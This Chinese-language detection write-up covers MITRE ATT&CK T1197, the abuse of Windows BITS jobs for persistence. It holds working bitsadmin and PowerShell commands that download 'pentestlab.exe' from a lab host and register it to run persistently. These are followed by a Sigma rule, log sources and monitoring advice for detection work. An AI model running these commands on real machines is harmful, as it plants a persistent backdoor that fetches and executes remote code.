# T1197-win-BITS Jobs权限维持

## 来自ATT&CK的描述

Windows BITS（后台智能传输服务）是一种通过COM（组件对象模型）公开的低带宽异步文件传输机制。BITS通常由更新程序、消息程序和其他希望在后台运行（使用可用空闲带宽）而不中断其他网络应用的程序使用。文件传输任务被实现为BITS任务，其中包含一个或多个文件操作队列。

可以通过PowerShell和BITSAdmin工具访问BITS任务创建和管理接口。

攻击者可能会在运行恶意代码后滥用BITS来实现下载、执行甚至清理动作。BITS任务包含在BITS任务数据库中，不需创建新文件或修改注册表，且通常是主机防火墙允许的。启用BITS的执行还可以通过创建长期任务（默认最大生命周期为90天且可延长）或在任务完成或出现错误（包括系统重启后的错误）时调用任意程序来允许持久性。

BITS上传功能也可用于执行Exfiltration Over Alternative Protocol。

## 测试案例

Windows操作系统包含各种实用程序，系统管理员可以使用它们来执行各种任务。这些实用程序之一是后台智能传输服务（BITS），它可以促进文件到Web服务器（HTTP）和共享文件夹（SMB）的传输能力。Microsoft提供了一个名为“bitsadmin”的二进制文件和PowerShell cmdlet，用于创建和管理文件传输。

从攻击的角度来看，可以滥用此功能，以便在受感染的主机上下载有效负载（可执行文件，PowerShell脚本，Scriptlet等）并在给定时间执行这些文件，在红队操作中可以用作保持持久性。但是，与“bitsadmin”进行交互需要管理员级别的权限。

执行以下命令会将恶意有效负载从远程位置下载到本地目录。

```dos
bitsadmin /transfer backdoor /download /priority high http://10.0.2.21/pentestlab.exe C:\tmp\pentestlab.exe #注意此处下载地址必须是标准的HTTP协议。
```

还有一个PowerShell cmdlet可以执行相同的任务。

```powershell
Start-BitsTransfer -Source "http://10.0.2.21/pentestlab.exe" -Destination "C:\tmp\pentestlab.exe"
```

将文件放入磁盘后，可以通过从“bitsadmin”实用程序执行以下命令来实现持久性。用法非常简单：

- 在创建参数需要任务的名称

``` dos
bitsadmin /create backdoor
```

- 该addfile需要文件的远程位置和本地路径

``` dos
bitsadmin /addfile backdoor "http://10.0.2.21/pentestlab.exe"  "C:\tmp\pentestlab.exe"
```

- 该SetNotifyCmdLine将执行的命令

```dos
bitsadmin /SetNotifyCmdLine backdoor C:\tmp\pentestlab.exe NUL
```

- 所述SetMinRetryDelay定义时间回调（秒）

```dos
bitsadmin /SetMinRetryDelay "backdoor" 60
```

- 该简历参数将运行位工作

```dos
bitsadmin /resume backdoor
```

## 检测日志

windows 安全日志/windows BITS应用日志/Windows sysmon日志

## 测试复现

![image1](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/894761-20191111110145812-668139170.png)

![image2](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/894761-20191111110227491-23710429.png)

![image3](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/894761-20191111110245500-1362389929.png)

## 测试留痕

![image4](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/lqedzV.png)

![image5](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/lqeWz6.png)

![image6](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/lqmiYn.png)

## 检测规则/思路

### Sigma规则

```yml
title: Bitsadmin Download
status: 测试阶段
description: 试用bitsadmin进行下载任务
references:
    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin
    - https://isc.sans.edu/diary/22264
tags:
    - attack.defense_evasion
    - attack.persistence
    - attack.t1197
    - attack.s0190
logsource:
    category: process_creation
    product: windows
detection:
    selection1:
        Eventid:
            - 4688 #windows 进程创建，当系统版本在2012以上，可记录命令行参数，可基于命令行参数进行监控。
            - 1    #sysmon 进程创建，当系统中部署有sysmon，可通过sysmon中的进程创建日志进行监控。
        Image:
            - '*\bitsadmin.exe' #此规则检测作用有限，不针对powershelll下场景做检测
        CommandLine:
            - '* /transfer *'
    selection2:
        CommandLine:
            - '*copy bitsadmin.exe*'
    condition: selection1 or selection2
fields:
    - CommandLine
    - ParentCommandLine
falsepositives:
    - Some legitimate apps use this, but limited.
level: medium
```

### 建议

建议非系统程序发起的BITS传送任务进行分析检测（白名单机制）。

BITS作为服务运行。可使用Sc查询实用程序（sc query bits）来检查其状态。可使用BITSAdmin工具（bitsadmin/list/allusers/verbose）枚举活跃的BITS任务。

监控BITSAdmin工具（尤其是Transfer，Create，AddFile，SetNotifyFlags，SetNotifyCmdLine，SetMinRetryDelay，SetCustomHeaders和Resume命令选项）的使用及Windows事件日志来查看BITS活动。还要考虑通过解析BITS任务数据库来调查任务相关的更多详细信息。

监控和分析BITS生成的网络活动。BITS任务使用HTTP（S）和SMB进行远程连接，仅限于创建用户，并且仅在该用户登录时才起作用（即使用户将任务附加到服务账号，此规则也适用）。

## 参考推荐

Window权限维持（六）

BITS Jobs <https://www.cnblogs.com/xiaozi/p/11833583.html>

MITRE-ATT&CK-T1197

<https://attack.mitre.org/techniques/T1197/>

MITRE ATT&CK 攻击知识库（企业）中文版

<https://hansight.github.io/#/detail>

BITS持久化留痕日志文件下载地址

<https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/blob/master/Persistence/persist_bitsadmin_Microsoft-Windows-Bits-Client-Operational.evtx>
